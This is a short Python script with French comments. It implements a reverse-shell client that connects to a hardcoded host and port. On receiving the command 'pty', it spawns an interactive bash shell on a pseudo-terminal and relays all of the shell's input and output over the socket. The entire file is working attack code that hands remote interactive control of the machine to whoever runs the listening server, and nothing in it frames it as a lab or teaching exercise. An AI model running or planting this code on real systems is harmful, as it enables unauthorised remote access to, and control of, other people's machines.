#!/usr/bin/env python3
import socket
import os
import pty
import select

# Configuration du serveur
HOST = '192.168.137.7'  # Adresse IP du serveur
PORT = 9999  # Port du serveur


def start_pty_session(s):
    """
    Démarre une session PTY interactive et redirige les commandes du serveur au PTY.
    """
    try:
        # Création d'un pseudo-terminal
        master, slave = pty.openpty()
        shell = "/bin/bash"

        # Définir les variables d'environnement nécessaires
        os.environ["TERM"] = "xterm"

        # Démarre le shell interactif avec buffering désactivé
        pid = os.fork()
        if pid == 0:  # Processus enfant
            os.setsid()  # Crée un nouveau groupe de processus
            os.close(master)
            os.dup2(slave, 0)  # STDIN
            os.dup2(slave, 1)  # STDOUT
            os.dup2(slave, 2)  # STDERR
            os.execv(shell, [shell, "-i"])  # Démarre un shell interactif
        else:  # Processus parent
            os.close(slave)
            s.send(b"PTY session started and TERM=xterm exported.\n")

            # Communication entre le serveur et le PTY
            while True:
                # Écoute les données venant du socket et du PTY
                rlist, _, _ = select.select([s, master], [], [])

                if s in rlist:  # Données reçues du serveur
                    data = s.recv(1024)
                    if not data:
                        break
                    os.write(master, data)  # Envoie les données au PTY

                if master in rlist:  # Données reçues du PTY
                    output = os.read(master, 1024)
                    s.send(output)  # Retourne les données au serveur
    except Exception as e:
        s.send(f"Error starting PTY session: {str(e)}\n".encode())


def connect_to_server():
    """
    Connecte le client au serveur et gère les commandes.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))

            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    break

                if data == "pty":
                    start_pty_session(s)
                else:
                    s.send(f"Unknown command: {data}\n".encode())
        except Exception as e:
            print(f"Connection error: {str(e)}")


if __name__ == "__main__":
    connect_to_server()
